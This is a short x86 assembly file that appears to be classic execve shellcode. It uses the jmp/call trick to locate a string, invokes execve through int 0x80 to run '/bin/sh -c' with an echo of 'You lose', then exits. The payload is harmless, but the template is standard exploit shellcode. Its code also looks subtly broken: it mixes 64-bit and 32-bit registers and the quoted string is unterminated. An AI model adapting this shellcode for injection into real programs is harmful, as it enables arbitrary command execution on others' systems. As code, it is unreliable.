.global main
.text

main:
     jmp 0x1f 
     popq %rsi
     movl %esi,0x8(%esi)
     xorl %eax,%eax
     movb %al,0x7(%esi)
     movl %eax,0xc(%esi)
     movb $0xb,%al
     movl %esi,%ebx
     leal 0x8(%esi),%ecx
     leal 0xc(%esi),%edx
     int $0x80
     xorl %ebx,%ebx
     movl %ebx,%eax
     inc %eax
     int $0x80
     call -0x24
     .string "/bin/sh -c 'echo \"You lose\""
